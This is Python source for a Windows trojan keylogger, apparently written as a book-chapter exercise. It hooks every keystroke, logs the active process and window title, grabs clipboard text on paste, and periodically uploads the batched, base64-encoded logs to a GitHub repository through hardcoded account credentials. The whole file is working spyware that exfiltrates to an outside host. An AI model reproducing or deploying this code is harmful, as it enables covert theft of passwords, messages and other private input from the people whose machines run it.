from ctypes import *
import pythoncom
import threading
import base64
import time
import pyHook
import win32clipboard
import random
from github3 import login

trojan_id = "abc"
user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_window = None
stringa=""


def store_module_result(data_str):
    if data_str==None:
        exit()
    print("--storing--")
    gh = login(username="NotMeObviously", password="KristoWasH3RE")
    repo = gh.repository("NotMeObviously", "chapter7")
    branch = repo.branch("master")
    print("--connecting to GitHub--")
    nameGit= random.randint(1000,10000)#"Key hour: %s - date: %s " % (time.strftime("%H:%M:%S"), time.strftime("%d/%m/%Y"))
    remote_path = "data/%s/%d" %(trojan_id, nameGit )
    #trasforma i dati da str a byte
    #data_byte=data_str.encode("UTF-8","replace")
    message = "Commit success!"
    repo.create_file(remote_path, message, base64.b64encode(data_str))
    print("--storing complete--")
    exit()
    

def str_composer(messaggio):
    global stringa
    if ((len(stringa)+len(messaggio))<200):
        stringa=stringa+messaggio
    else:
        storeT=threading.Thread(target=store_module_result,args=(stringa,))
        storeT.start()
        print("stringa pre: %s"%stringa)
        stringa=""
        print("stringa: %s"%stringa)


def get_current_process():
    #gestore finestra primo piano
    hwnd = user32.GetForegroundWindow()
    #id processo
    pid = c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd, byref(pid))
    process_id = "%d" % pid.value
    executable = create_string_buffer( "\x00" * 512)
    h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)
    psapi.GetModuleBaseNameA(h_process, None,byref(executable), 512)
    window_title = create_string_buffer("\x00" * 512)
    lenght = user32.GetWindowTextA(hwnd, byref(window_title), 512)
    print("")
    print("[ PID: %s - %s - %s ]" %(process_id, executable.value, window_title.value))
    print("")
    mex="{PID:%s-%s-%s|" %(process_id, executable.value, window_title.value)
    str_composer(mex)
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)



def KeyStroke(event):
    global current_window

    #verifica se il target ha cambiato finestra
    if event.WindowName != current_window:
        current_window = event.WindowName
        get_current_process()

    if event.Ascii > 32 and event.Ascii < 127:
        mex=chr(event.Ascii)
        print(mex), #virgola tutto sulla stessa riga
        str_composer(mex)
    else: 
        #se [Ctrl-V] recupera il testo
        if event.Key == 'V':
            win32clipboard.OpenClipboard()
            pasted_value = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            print("[P]-%s-" % pasted_value)
            str_composer(pasted_value)
        else:
            mex="[%s]" % event.Key
            print(mex)
            str_composer(mex)
        
    return True


def run():
    kl = pyHook.HookManager()
    kl.KeyDown = KeyStroke
    #registra hook ed eseguilo per sempre
    kl.HookKeyboard()
    pythoncom.PumpMessages()



kl = pyHook.HookManager()
kl.KeyDown = KeyStroke

#registra hook ed eseguilo per sempre
kl.HookKeyboard()
pythoncom.PumpMessages()
